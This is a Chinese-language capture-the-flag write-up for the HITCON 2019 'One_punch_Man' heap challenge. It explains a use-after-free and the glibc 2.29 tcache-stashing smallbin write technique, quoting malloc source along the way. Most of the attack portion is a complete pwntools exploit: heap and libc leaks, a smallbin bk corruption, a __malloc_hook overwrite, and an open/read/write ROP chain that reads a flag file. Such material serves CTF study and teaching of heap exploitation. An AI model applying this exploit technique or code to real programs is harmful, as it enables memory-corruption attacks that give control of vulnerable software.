# HITCON2019-Quals One_punch_Man

这题是在glibc2.29下的利用，所以记录下解题的一些新颖的思路

## 漏洞分析

`retire`函数里的UAF：

```c
void retire()
{
  unsigned int v0; // [rsp+Ch] [rbp-4h]

  writen("idx: ");
  v0 = get_int();
  if ( v0 > 2 )
    error((__int64)"invalid");
  free((void *)chunks[v0].ptr);
}
```

一个后门选项：

```c
__int64 __fastcall sub_15BB(__int64 a1, __int64 a2)
{
  void *buf; // [rsp+8h] [rbp-8h]

  if ( *(_BYTE *)(heap_base + 0x20) <= 6 )
    error((__int64)"gg");
  buf = malloc(0x217uLL);
  if ( !buf )
    error((__int64)"err");
  if ( read(0, buf, 0x217uLL) <= 0 )
    error((__int64)"io");
  puts("Serious Punch!!!");
  puts(&unk_2128);
  return puts(buf);
}
```

题目的`add`函数用的是`calloc`函数,意味着进入了`tcache`的堆块是不会在被取出来了，但是后门函数里用的是`malloc`，所以我们的目标就是要使得`*(_BYTE *)(heap_base + 0x20) > 6`，已达到利用后门的效果

## 思路1

很自然的想到要是能用`unsortedbin attack`就好了，但是这在libc2.29下是行不通的：

```c
 while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
          bck = victim->bk;
          size = chunksize (victim);
          mchunkptr next = chunk_at_offset (victim, size);

          if (__glibc_unlikely (size <= 2 * SIZE_SZ)
              || __glibc_unlikely (size > av->system_mem))
            malloc_printerr ("malloc(): invalid size (unsorted)");
          if (__glibc_unlikely (chunksize_nomask (next) < 2 * SIZE_SZ)
              || __glibc_unlikely (chunksize_nomask (next) > av->system_mem))
            malloc_printerr ("malloc(): invalid next size (unsorted)");
          if (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))
            malloc_printerr ("malloc(): mismatching next->prev_size (unsorted)");
          if (__glibc_unlikely (bck->fd != victim)
              || __glibc_unlikely (victim->fd != unsorted_chunks (av)))
            malloc_printerr ("malloc(): unsorted double linked list corrupted");
          if (__glibc_unlikely (prev_inuse (next)))
            malloc_printerr ("malloc(): invalid next->prev_inuse (unsorted)");
```

我后来谷歌了下wp，找到了一篇[wp](https://medium.com/@ktecv2000/hitcon-ctf-2019-quals-one-punch-man-pwn-292pts-3e94eb3fd312 ),里面用的方法有点类似于`unsortedbin attack`,不得不佩服大佬的思路，orz

文章里提到的方法是，当从`smallbin`里申请一个堆块的时候，会把剩下的`smallbin`也链入相对应大小的`tcache`，前提是相应大小的`tcache`没满，相对应的源码为：
```c
if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        {
          bck = victim->bk;
	  if (__glibc_unlikely (bck->fd != victim))
	    malloc_printerr ("malloc(): smallbin double linked list corrupted");
          set_inuse_bit_at_offset (victim, nb);
          bin->bk = bck;
          bck->fd = bin;

          if (av != &main_arena)
	    set_non_main_arena (victim);
          check_malloced_chunk (av, victim, nb);
#if USE_TCACHE
	  /* While we're here, if we see other chunks of the same size,
	     stash them in the tcache.  */
	  size_t tc_idx = csize2tidx (nb);
	  if (tcache && tc_idx < mp_.tcache_bins)
	    {
	      mchunkptr tc_victim;

	      /* While bin not empty and tcache not full, copy chunks over.  */
	      while (tcache->counts[tc_idx] < mp_.tcache_count
		     && (tc_victim = last (bin)) != bin)
		{
		  if (tc_victim != 0)
		    {
		      bck = tc_victim->bk;
		      set_inuse_bit_at_offset (tc_victim, nb);
		      if (av != &main_arena)
			set_non_main_arena (tc_victim);
		      bin->bk = bck;
		      bck->fd = bin;

		      tcache_put (tc_victim, tc_idx);
	            }
		}
	    }
#endif
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }
```

此处是没有对`smallbin`进行check的：

```c
if (tc_victim != 0)
		    {
		      bck = tc_victim->bk;
		      set_inuse_bit_at_offset (tc_victim, nb);
		      if (av != &main_arena)
			set_non_main_arena (tc_victim);
		      bin->bk = bck;
		      bck->fd = bin;
```

所以我们可以伪造`tc_victim->bk`,然后到了`bck->fd=bin`这一句，就可以向一个地址写入一个libc的值了，类似于`unsortedbin attack`,要注意的话就是相对应大小的`tcache bin`为6个，这样的话`tcache_put`后，就会退出循环，把`chunk`返回，不会造成段错误

这里有个大问题，就是程序申请的堆块大小范围在`0x7f~0x400`之间，所以在`tcache`没满的情况下，`free`后都会进入`tcache`,那要怎么让一个大小的堆块，比如`0x100`大小的堆块，相对应的`tcache bin`有6块，`smallbin`有两块，文章里又提到了用`last_remainder`：

```c
 if (in_smallbin_range (nb) &&
              bck == unsorted_chunks (av) &&
              victim == av->last_remainder &&
              (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
            {
              /* split and reattach remainder */
              remainder_size = size - nb;
              remainder = chunk_at_offset (victim, nb);
              unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
              av->last_remainder = remainder;
              remainder->bk = remainder->fd = unsorted_chunks (av);
              if (!in_smallbin_range (remainder_size))
                {
                  remainder->fd_nextsize = NULL;
                  remainder->bk_nextsize = NULL;
                }

              set_head (victim, nb | PREV_INUSE |
                        (av != &main_arena ? NON_MAIN_ARENA : 0));
              set_head (remainder, remainder_size | PREV_INUSE);
              set_foot (remainder, remainder_size);

              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }

```

比如我们把`unsortedbin`切成了`0x100`的大小，如果在`calloc`一个比这个大的`chunk`,那这个`unsortedbin`就会被放到`smallbin`，相对应的源码为：

```c
 /* place chunk in bin */

          if (in_smallbin_range (size))
            {
              victim_index = smallbin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;
            }
          else
            {
              victim_index = largebin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;
```

这样的话一切条件都有了,真正的**one_punch**

还有一点要注意的是，我们用这个方法把`heap+0x30`的地方改写了，这样的话其实`tcache`会 corrupt 掉：

```
pwndbg> bins
tcachebins
0x100 [  7]: 0x563a59056000 —▸ 0x563a59053760 —▸ 0x563a59053660 —▸ 0x563a59053560 —▸ 0x563a59053460 —▸ 0x563a59053360 —▸ 0x563a59053260 ◂— 0x0
0x1d0 [-112]: 0x0
0x1e0 [-19]: 0x0
0x1f0 [-41]: 0x0
0x200 [-45]: 0x0
0x210 [-99]: 0x0
0x220 [125]: 0x0
0x410 [  7]: 0x563a590550c0 —▸ 0x563a59054cb0 —▸ 0x563a590548a0 —▸ 0x563a59054490 —▸ 0x563a59054080 —▸ 0x563a59053c70 —▸ 0x563a59053860 ◂— 0x0

```

所以我们要在攻击前先申请一个`0x217`大小的堆块，然后释放掉，在攻击

exp为：

```python
from pwn import *

context.arch = 'amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))
		

def cmd(c):
	p.recvuntil("> ")
	p.sendline(str(c))
	
def add(idx,name):
	cmd(1)
	p.recvuntil("idx: ")
	p.sendline(str(idx))
	p.recvuntil("name: ")
	p.send(name)
def dele(idx):
	cmd(4)
	p.recvuntil("idx: ")
	p.sendline(str(idx))

def show(idx):
	cmd(3)
	p.recvuntil("idx: ")
	p.sendline(str(idx))

def edit(idx,name):
	cmd(2)
	p.recvuntil("idx: ")
	p.sendline(str(idx))
	p.recvuntil("name: ")
	p.send(name)

def main(host,port=26976):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./one_punch")
		# debug(0x0000000000015BB)
		# gdb.attach(p)
	for i in range(2):
		add(i,"A"*0xf8)
	dele(0)
	dele(1)
	show(1)
	p.recvuntil(": ")
	heap = u64(p.recvuntil("\n",drop=True).ljust(8,b"\x00")) - 0x260
	for i in range(4):
		add(0,"A"*0xf8)
		dele(0)
	for i in range(7):
		add(0,"A"*0x400)
		dele(0)
	for i in range(2):
		add(i,"A"*0x400)
	dele(0)
	show(0)
	p.recvuntil(": ")
	libc.address = u64(p.recvuntil("\n",drop=True).ljust(8,b"\x00")) - 0x1e4ca0
	info("heap : " + hex(heap))
	info("libc : " + hex(libc.address))
	add(1,"A"*0x300)
	add(2,"A"*0x400)
	add(1,"A"*0x400)
	dele(2)
	add(1,"A"*0x300)
	add(1,"A"*0x400)
	add(0,"A"*0x217)
	payload = b"\x00"*0x108+b"/flag.txt"+b"\x00"*(0x7+0x1f0)+p64(0x101)+p64(heap+0x27d0)+p64(heap+0x30-0x10-5)
	edit(2,payload)
	dele(0)
	add(2,"A"*0xf8)
	edit(0,p64(libc.symbols["__malloc_hook"]))
	cmd(str(50056))
	p.send("C"*8)
	cmd(str(50056))
	p.send(p64(libc.address+0x000000000008cfd6))
	# pause()
	# 0x000000000008cfd6: add rsp, 0x48; ret;
	# 0x0000000000026542: pop rdi; ret;
	# 0x000000000012bdc9: pop rdx; pop rsi; ret;
	# 0x0000000000047cf8: pop rax; ret;
	# 0x00000000000cf6c5: syscall; ret;
	p_rdi = 0x0000000000026542+libc.address
	p_rdx_rsi = 0x000000000012bdc9+libc.address
	p_rax = 0x0000000000047cf8+libc.address
	syscall_ret = 0x00000000000cf6c5+libc.address
	payload = p64(p_rdi)+p64(heap+0x2df8)+p64(p_rdx_rsi)+p64(0)*2+p64(p_rax)+p64(2)+p64(syscall_ret)
	payload += p64(p_rdi)+p64(3)+p64(p_rdx_rsi)+p64(0x80)+p64(heap+0x2d00)+p64(p_rax)+p64(0)+p64(syscall_ret)
	payload += p64(p_rdi)+p64(1)+p64(p_rax)+p64(1)+p64(syscall_ret)
	payload += p64(p_rdi)+p64(0)+p64(p_rax)+p64(0)+p64(syscall_ret)
	payload = payload.ljust(0x100,b"\x00")
	gdb.attach(p)
	add(2,payload)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	main(args['REMOTE'])
```

## 参考链接

[ https://medium.com/@ktecv2000/hitcon-ctf-2019-quals-one-punch-man-pwn-292pts-3e94eb3fd312 ]( https://medium.com/@ktecv2000/hitcon-ctf-2019-quals-one-punch-man-pwn-292pts-3e94eb3fd312 )